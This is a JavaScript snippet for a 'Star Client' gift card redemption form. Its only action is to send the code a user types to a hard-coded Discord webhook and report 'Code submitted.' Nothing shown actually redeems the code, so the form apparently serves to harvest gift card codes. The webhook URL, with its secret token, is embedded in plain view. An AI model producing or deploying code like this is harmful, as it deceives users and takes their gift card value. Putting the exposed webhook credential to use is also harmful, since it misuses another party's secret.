const WEBHOOK_URL = "https://discord.com/api/webhooks/1453158342452187187/oYYnqUKNd_-3GbA_AE53w55gCfhjvMlB0HcItC53RieMvKPKXNG14Yz00MpUZVerybII";

function redeemCode() {
  const code = redeemCodeInput.value.trim().toUpperCase();
  const status = document.getElementById("redeemStatus");

  fetch(WEBHOOK_URL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      embeds: [{
        title: "🎁 Star Client | Redeem",
        fields: [
          { name: "Gift Card Code", value: code }
        ],
        timestamp: new Date().toISOString()
      }]
    })
  });

  status.style.color = "#57F287";
  status.textContent = "Code submitted.";
}
